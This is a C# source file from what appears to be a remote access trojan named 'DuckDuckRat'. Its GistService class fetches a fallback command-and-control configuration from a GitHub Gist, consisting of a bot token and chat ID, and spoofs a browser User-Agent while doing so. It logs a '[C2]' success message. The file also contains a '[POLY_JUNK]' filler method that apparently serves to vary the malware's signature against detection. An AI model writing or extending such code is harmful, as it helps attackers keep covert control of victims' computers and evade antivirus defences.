using System;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;

namespace DuckDuckRat
{
    public static class GistService
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_70df619e() {
            int val = 90289;
            if (val > 50000) Console.WriteLine("Hash:" + 90289);
        }

        // Replace with the actual URL of the RAW Gist containing JSON: {"token": "...", "chat_id": "..."}
        private const string GistUrl = "https://gist.githubusercontent.com/ptrkxlord/YOUR_GIST_ID/raw/config.json";

        public static async Task<(string Token, string ChatId)?> GetFallbackConfigAsync()
        {
            try
            {
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                client.Timeout = TimeSpan.FromSeconds(10);

                string jsonStr = await client.GetStringAsync(GistUrl);
                
                using JsonDocument doc = JsonDocument.Parse(jsonStr);
                string token = doc.RootElement.GetProperty("token").GetString();
                string chatId = doc.RootElement.GetProperty("chat_id").GetString();

                if (!string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(chatId))
                {
                    Logger.Info("[C2] Successfully retrieved fallback config from Gist.");
                    return (token, chatId);
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to fetch Gist fallback config", ex);
            }
            return null;
        }
    }
}


